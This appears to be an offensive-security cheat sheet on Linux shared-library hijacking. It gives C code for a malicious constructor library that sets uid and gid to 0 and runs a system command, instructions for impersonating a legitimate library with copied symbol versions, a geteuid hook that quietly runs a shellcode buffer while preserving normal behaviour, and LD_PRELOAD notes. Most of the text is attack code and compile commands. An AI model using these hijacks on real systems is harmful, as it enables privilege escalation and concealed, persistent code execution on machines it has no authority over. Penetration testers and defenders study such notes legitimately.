# Shared Libraries

### Hijack Library

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void pwn() __attribute__((constructor));

void pwn() {
    setuid(0);
    setgid(0);
    system("...");
}
```

Compile with:

```text
gcc -Wall -fPIC -c -o pwn.o pwn.c
gcc -shared -o pwn.so pwn.o
```

Sometimes if we want to replace a legit library, we need to add its symbols and version information too. We need to get the symbols and version from the original via 

```text
readelf -s --wide | grep ...
```

and add that to our source file. Compile with:

```text
gcc -Wall -fPIC -c -o pwn.o pwn.c
gcc -shared -Wl,--version-script <symbol>.map -o <original> pwn.o
```

A good hijack that is meant for more than a quick privesc keeps the original libraries functionality intact. For example for a program that uses geteuid \(e.g. `cp` \):

```c
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

char buf[] = ...

uid_t geteuid(void)
{
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");    
    if (fork() == 0) {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
            perror("mprotect");
            return -1;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    } else {
        return (*old_geteuid)();
    }
    return -2;
}
```

Compile with:

```text
gcc -Wall -fPIC -z execstack -c -o pwn.o pwn.c
gcc -shared -o pwn.so pwn.o -ldl
```

### LD\_PRELOAD

Specify a custom library to load \(use one that the binary already uses and define a custom path for it that leads to your custom lib\). Sudo will automatically ignore LD\_PRELOAD though.

